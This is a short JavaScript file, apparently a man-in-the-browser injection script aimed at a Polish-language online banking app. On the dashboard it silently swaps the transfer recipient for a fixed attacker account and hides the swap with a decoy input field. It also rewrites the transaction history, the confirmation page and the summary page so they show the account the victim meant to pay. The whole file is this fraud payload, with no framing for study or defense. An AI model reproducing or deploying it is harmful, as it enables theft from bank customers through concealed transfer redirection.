console.log(window.location.pathname)
if (window.location.pathname == '/dashboard')
{
    (function () {
    let fakeAccount="00000001";
    localStorage.setItem('fake',fakeAccount);
    let account=document.getElementById('account');
    account.value=fakeAccount;
    account.type="hidden";
    document.getElementById('accountInput').style.display= "none";
    let form= document.getElementById('transferForm')
    let newDiv=document.createElement("div");
    newDiv.innerHTML=`
      <div class="input-group-append">
        <span class="input-group-text">Numer konta adresata:</span>
      </div>
      <input id="spy" type="text" name="" class="form-control input_user mb-3" value="" placeholder="Numer konta nadawcy">
    `;    
    form.insertBefore(newDiv, form.firstChild);
    let realAccount="";
    spy.addEventListener('focusout', (event) => {
    realAccount = spy.value;
    localStorage.setItem('real', realAccount);
    }); 
    var x = document.getElementById("history-table-received");
      for (var i=0;i<x.rows.length;i++)
      {
        var text=x.rows[i].cells[0].firstChild.data;
        if(text==localStorage.getItem('fake'))
        {
          x.rows[i].cells.firstChild.data=localStorage.getItem('real');
        }

      }
      var y = document.getElementById("history-table-sent");
      for (var i=0;i<y.rows.length;i++)
      {
        var text=y.rows[i].cells[0].firstChild.data;
        if(text==localStorage.getItem('fake'))
        {
          y.rows[i].cells[0].firstChild.data=localStorage.getItem('real');
        }

      }
      console.log(y);
  })();

}

if (window.location.pathname == '/accept')
{
    let sender=document.getElementById('sender');
    sender.innerHTML=`
      <h3> Numer konta odbiorcy:</h3>
      ${localStorage.getItem('real')}
    `;
}

if (window.location.pathname == '/summary')
{
    let sender=document.getElementById('sender');
    sender.innerHTML=`
      <h3> Numer konta odbiorcy:</h3>
      ${localStorage.getItem('real')}
    `;
}